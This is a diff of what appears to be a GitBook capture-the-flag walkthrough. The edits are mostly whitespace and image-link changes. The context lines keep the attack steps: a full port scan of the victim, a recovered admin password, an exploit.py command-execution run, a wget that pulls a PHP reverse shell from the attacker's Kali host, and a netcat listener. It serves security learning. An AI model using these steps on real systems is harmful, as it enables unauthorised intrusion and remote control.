@@ -11,8 +11,6 @@
 
 <figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Scan all ports
 
 **Kali**
@@ -20,11 +18,7 @@
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## TCP/80 - HTTP
 
@@ -50,10 +44,6 @@ nc -v $VICTIM 1337
 
 <figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
 ## TCP/80 - HTTP
 
 **Browser**
@@ -66,8 +56,6 @@ Password: OllieUnixMontgomery!
 
 
 <figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
 
 ## Initial Shell
 
@@ -82,8 +70,6 @@ python3 exploit.py  -usr admin -pwd OllieUnixMontgomery! -cmd 'whoami' -url http
 ```
 
 <figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
 
 We can run commands from the browser as well.
 
@@ -122,8 +108,6 @@ wget http://$KALI:81/php-reverse-shell.php -O immaolllieeboyyy/test.php
 <figure><img src="../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>
-
-
 
 Get autocomplete
 
@@ -198,4 +182,3 @@ nc -lvnp 1338
 <figure><img src="../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>
-
